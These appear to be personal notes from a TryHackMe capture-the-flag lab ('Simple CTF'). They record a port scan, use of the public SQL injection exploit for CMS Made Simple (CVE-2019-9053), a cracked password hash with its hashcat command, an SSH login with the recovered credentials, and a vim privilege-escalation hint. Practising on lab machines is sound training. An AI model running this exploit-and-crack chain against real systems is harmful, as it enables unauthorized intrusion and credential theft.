2022-06-14 
Simple CTF @ Tryhackme
# gryNet

$IP = 10.10.5.4

21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)


CVE-2019-9053

CMS Made Simple < 2.2.10 - SQL Injection                                          | php/webapps/46635.py

Script is broken. Print function not working. Fix with parenthesis.

sqle.py -u http://10.10.5.4/simple

salt: 1dac0d92e9fa6bb2
username: mitch
email: admin@admin.com
password: 0c01f4468bd75d7a84c7eb73846e8d96
hash to crack: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2

hashcat -O -m 20 -a 0 hash.txt /usr/share/seclists/Passwords/Common-Credentials/best110.txt

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret

ssh mitch@10.10.5.4 -p 2222 
secret

vim gftobin